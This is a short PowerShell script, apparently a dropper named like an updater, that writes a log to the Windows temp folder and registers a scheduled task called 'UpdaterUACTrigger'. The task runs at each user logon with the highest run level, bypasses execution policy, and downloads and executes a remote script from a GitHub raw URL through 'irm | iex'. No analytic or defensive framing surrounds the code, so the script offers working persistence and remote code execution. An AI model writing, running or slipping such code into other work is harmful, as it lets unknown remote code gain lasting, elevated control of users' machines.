# Define log path
$logPath = "C:\Windows\Temp\updater_log.txt"
"[{0}] Boot-time script executed. Preparing scheduled task for UAC prompt..." -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss") | Out-File $logPath -Append -Encoding utf8

# Scheduled task details
$taskName = "UpdaterUACTrigger"
$scriptUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1"

# Create scheduled task to run on next user logon
try {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -Command `"irm $scriptUrl | iex`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn
    $principal = New-ScheduledTaskPrincipal -UserId "BUILTIN\Users" -LogonType Interactive -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force

    "[{0}] Scheduled task '$taskName' created successfully." -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss") | Out-File $logPath -Append -Encoding utf8
}
catch {
    "[{0}] Failed to create scheduled task. Error: $_" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss") | Out-File $logPath -Append -Encoding utf8
}
